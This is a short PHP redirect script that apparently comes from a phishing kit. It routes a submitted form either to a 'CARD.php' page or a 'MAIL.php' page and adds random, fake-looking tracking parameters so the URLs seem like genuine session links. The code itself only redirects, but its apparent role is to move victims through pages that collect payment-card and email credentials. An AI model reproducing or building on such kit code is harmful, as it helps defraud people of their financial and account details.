<?php if( $_POST['action'] == 'CARD' ) 
           header("Location: ../CARD.php?websrc=".md5('d5d630d4355544115ee3ade77a6141ee')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)."");
      else 
           header("Location: ../MAIL.php?websrc=".md5('d5d630d4355544115ee3ade77a6141ee')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)."");
?>